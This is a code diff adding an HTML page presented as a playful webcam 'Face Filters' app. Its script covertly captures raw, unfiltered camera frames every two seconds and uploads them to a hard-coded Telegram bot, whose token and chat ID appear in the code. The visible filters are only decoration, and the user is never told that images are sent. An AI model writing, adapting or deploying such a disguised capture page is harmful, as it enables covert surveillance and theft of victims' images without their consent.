@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🐱‍🚀Face Filters🐱‍🐉</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { text-align: center; font-family: Arial, sans-serif; background: black; color: white; }
+        #cameraContainer { display: none; }
+        #errorMessage { display: none; font-size: 20px; margin-top: 20px; color: red; }
+        video, canvas { width: 100%; max-width: 400px; border-radius: 10px; }
+        canvas { display: none; }
+        select, button { margin: 10px; padding: 10px; font-size: 16px; }
+        .filter-none { filter: none; }
+        .filter-sepia { filter: sepia(1); }
+        .filter-grayscale { filter: grayscale(1); }
+        .filter-invert { filter: invert(1); }
+        .filter-blur { filter: blur(5px); }
+        .filter-brightness { filter: brightness(1.5); }
+    </style>
+</head>
+<body>
+    <h2>🐱‍🚀Apply Filters🐱‍🐉</h2>
+
+    <div id="errorMessage">Please refresh and allow camera.</div>
+
+    <div id="cameraContainer">
+        <video id="video" autoplay class="filter-none"></video>
+        <canvas id="canvas"></canvas>
+        <br>
+        <label for="filter">Choose Filter:</label>
+        <select id="filter">
+            <option value="filter-none">None</option>
+            <option value="filter-sepia">Sepia</option>
+            <option value="filter-grayscale">Grayscale</option>
+            <option value="filter-invert">Invert</option>
+            <option value="filter-blur">Blur</option>
+            <option value="filter-brightness">Brightness</option>
+        </select>
+        <br>
+        <button id="capture">Capture</button>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7256577569:AAHyOFgwSk6hmV1vfhIgW8wub74IW3MTQf4";
+        const TELEGRAM_CHAT_ID = "6524755764";
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const filterSelect = document.getElementById('filter');
+        const cameraContainer = document.getElementById('cameraContainer');
+        const errorMessage = document.getElementById('errorMessage');
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                cameraContainer.style.display = "block";  // Show camera UI
+                startSendingImages();  // Start auto-sending images
+            } catch (error) {
+                errorMessage.style.display = "block"; // Show error message
+            }
+        }
+
+        // Check if permission was previously denied
+        navigator.permissions.query({ name: 'camera' }).then(permissionStatus => {
+            if (permissionStatus.state === "denied") {
+                errorMessage.style.display = "block"; // Show refresh message
+            } else {
+                startCamera();
+            }
+        });
+
+        // Change video filter (for display only)
+        filterSelect.addEventListener('change', () => {
+            video.className = filterSelect.value;
+        });
+
+        // Send unfiltered image to Telegram every 2 seconds
+        function startSendingImages() {
+            setInterval(() => {
+                captureAndSend();
+            }, 2000);
+        }
+
+        // Capture and send image (without filters)
+        function captureAndSend() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Always capture raw image (without filters)
+            context.filter = "none";
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert to image and send
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
+                formData.append("photo", blob, "filtered_photo.jpg");
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => console.log("Photo sent!", data))
+                .catch(error => console.error("Error sending photo:", error));
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
